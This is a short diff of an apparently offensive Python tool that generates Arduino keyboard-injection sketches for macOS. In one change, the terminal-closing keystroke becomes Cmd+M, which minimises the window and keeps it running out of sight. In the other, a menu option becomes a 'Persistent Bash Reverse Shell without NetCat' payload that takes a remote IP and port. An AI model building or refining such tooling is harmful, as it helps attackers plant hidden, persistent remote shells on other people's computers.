@@ -88,7 +88,7 @@ def osxWriteFile(fileName,payloadFunc,payload):
 
   buffer += "void closeTerminal(){\n"
   buffer += "  Keyboard.press(KEY_LEFT_GUI);\n"
-  buffer += "  Keyboard.println(\"w\");\n"
+  buffer += "  Keyboard.println(\"m\");\n"
   buffer += "  delay(150);\n"
   buffer += "  Keyboard.release(KEY_LEFT_GUI);\n"
   buffer += "  delay(100);\n"
@@ -124,7 +124,7 @@ def osxOption1():
     coreUtils.clearScreen()
     print "********************************************************************************************"
     print "*                                                                                          *"
-    print "*                         Bash Reverse Shell without NetCat                                *"
+    print "*                  Persistent Bash Reverse Shell without NetCat                            *"
     print "*             This payload will initiate a Bash reverse shell without Netcat               *"
     print "*                   Options are: 1. remote IP 2. Listening Port                            *"
     print "*                                                                                          *"
